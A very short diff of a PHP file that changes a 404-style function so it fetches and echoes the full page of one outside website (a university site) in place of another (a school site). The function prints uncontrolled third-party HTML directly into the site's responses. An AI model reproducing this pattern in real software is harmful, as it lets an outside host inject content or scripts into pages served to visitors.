@@ -1,7 +1,7 @@
 <?php
 function feedback404()
 {
-  echo file_get_contents("https://sman1sanamanmantikei.sch.id/");
+  echo file_get_contents("https://feb.unisba.ac.id/");
 
 }
 
